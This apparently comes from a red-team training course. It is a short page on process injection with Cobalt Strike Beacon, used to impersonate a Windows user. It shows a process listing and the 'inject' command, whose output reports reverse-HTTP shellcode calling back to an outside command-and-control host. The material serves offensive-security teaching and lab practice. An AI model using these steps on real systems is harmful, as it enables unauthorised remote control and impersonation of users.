# Process Injection

Another, admittedly crude technique for impersonating a user, is to inject \[[T1055](https://attack.mitre.org/techniques/T1055/)] Beacon shellcode directly into a process they are running.  The new Beacon session that comes back will be running in the address space of this process and therefore under the security context of its owner.

Find a target process using the `ps` command or the process explorer, then inject shellcode for the given listener into it.

```batch
 PID   PPID  Name                       Arch  Session     User
 ---   ----  ----                       ----  -------     ----
 5248  1864  cmd.exe                    x64   0           CONTOSO\rsteel
 5256  5248      conhost.exe            x64   0           CONTOSO\rsteel
 5352  5248      mmc.exe                x64   0           CONTOSO\rsteel
 
beacon> inject 5248 x64 http
[*] Tasked beacon to inject windows/beacon_http/reverse_http (www.bleepincomputer.com:80) into 5248 (x64)
```

<figure><img src="https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/406ca8e0c9496eceaf963320db24bd43.png" alt="" height="86" width="914"><figcaption></figcaption></figure>

{% hint style="info" %}
You need a high-integrity session to inject into processes other than your own.
{% endhint %}
